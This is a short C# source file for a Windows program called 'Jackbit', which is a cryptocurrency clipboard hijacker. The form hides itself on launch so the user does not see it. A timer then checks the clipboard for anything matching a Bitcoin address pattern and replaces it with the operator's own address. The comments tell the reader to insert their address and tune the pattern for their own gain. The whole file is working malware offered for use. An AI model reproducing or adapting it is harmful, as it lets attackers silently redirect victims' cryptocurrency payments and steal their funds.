using System;
using System.Windows.Forms;
using System.Text.RegularExpressions;

namespace Jackbit
{
    public partial class Form1 : Form
    {
        Regex r = new Regex(@"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})"); //Regex for BTC Addresses (May get some testnets etc) you can tweak this to your own benefit
        public Form1(){InitializeComponent();}
        private void Form1_Load(object sender, EventArgs e){ Hide(); } // Hides the form on load to reduce user visibility
        private void timer1_Tick(object sender, EventArgs e){if (r.IsMatch(Clipboard.GetText())){Clipboard.Clear();Clipboard.SetText("YOUR_BTC_ADDRESS_HERE");} } // Match Clipboard To Regex, replace MATCH with your address
    }
}